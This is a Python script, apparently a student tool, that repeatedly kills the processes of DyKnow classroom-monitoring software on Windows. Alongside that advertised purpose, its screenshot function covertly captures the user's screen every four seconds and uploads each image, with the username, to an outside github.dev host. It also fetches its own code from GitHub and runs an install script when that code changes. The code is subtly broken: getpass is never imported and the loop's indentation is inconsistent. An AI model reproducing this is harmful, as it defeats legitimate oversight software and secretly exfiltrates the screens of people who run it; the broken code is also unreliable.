import os.path, subprocess, glob, time, signal, sys
import urllib.request as r
import urllib.error, hashlib, hmac

def importinstall(pipname,modulename=None,update=False,**importkwargs):
    if modulename is None:
        modulename = pipname
    if not update:
        try:
            return __import__(modulename)
        except ImportError:
            pass
    subprocess.call(rf'pip install{" --upgrade" if update else ""} {pipname}', shell=True)
    return __import__(modulename)

pyscreeze = importinstall('pyscreeze')

def screenshot():
    img = pyscreeze.screenshot()
    img = img.resize((int(img.size[0]/img.size[1]*340),340))
    img.save('tmp.png')
    with open('tmp.png', 'rb') as imgbytes:
        request('https://bookish-system-jgvv7pxj96wh5wjq-8080.app.github.dev/receive/'+getpass.getuser(), imgbytes.read(), 'POST')



def request(url, data=None, method="GET", headers={}):
    robj = r.Request(url, data, method=method, headers=headers)
    try:
        d = r.urlopen(robj).read()
    except urllib.error.HTTPError as e:
        return e
    return d


dynomaindir = r"C:\Program Files\DyKnow\Cloud"
if not os.path.exists(dynomaindir):
    input("U no have Dyknow! Press enter to exit.")
    sys.exit()

checkupdates=True

data = request("https://raw.githubusercontent.com/magentapenguin/dy-no/master/nodyno.py")
try:
    with open(sys.argv[0], "rb") as f:
        filedata = f.read()
except:
    filedata = b""
y = hashlib.sha256(filedata)
if not hasattr(data, "getcode"):
    x = hashlib.sha256(data)
    if not hmac.compare_digest(x.digest(), y.digest()) and checkupdates:
        subprocess.call("python install.py")
        sys.exit()
dirs = [x for x in os.scandir(dynomaindir) if x.is_dir()]
dynodir = sorted(dirs, key=lambda x: int(x.name.replace(".","")))[0].path
ignore = ("DyKnowTest.exe","DyKnowLogSender.exe", "Demo64_32.exe","Demo32_64.exe", "dkInteractive.exe", "winProcess.exe", "MonitorStateReader.exe")
verbose = True
usednames = []


def f(x):
    out = subprocess.call(rf'wmic process where name="{x}" delete', shell=True)
    if verbose:
        if not out:
            print("killed",x)
        else:
            print("failed",x, "code:",out,file=sys.stderr)

def f2():
    stop = False
    def close(*args):
        nonlocal stop
        print("Stopping...", usednames)
        stop = True
    signal.signal(signal.SIGINT, close)
    while not stop:
       for x in glob.iglob(dynodir+r"\*.exe"):
           x = os.path.split(x)[1]
           if x in ignore:
               continue
           f(x)
           usednames.append(x)
           #print(usednames)
        screenshot()
        time.sleep(4)

if __name__ == '__main__':
    f2()
